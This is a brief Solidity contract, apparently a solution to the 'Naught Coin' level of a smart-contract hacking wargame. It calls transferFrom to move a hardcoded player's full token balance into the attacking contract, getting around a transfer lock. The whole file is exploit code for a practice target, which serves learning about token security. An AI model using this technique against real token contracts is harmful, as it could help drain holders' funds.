// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract NaughtCoinAttack {
    address private target_token;
    address public player = 0x492E904fC65B8570829d0F6162d5441bA06Ffd48;

    constructor(address _target_token) {
        target_token = _target_token;
    }
    
    function attack() external {
        IERC20(target_token).transferFrom(player, address(this), 1000000000000000000000000);
    }

}
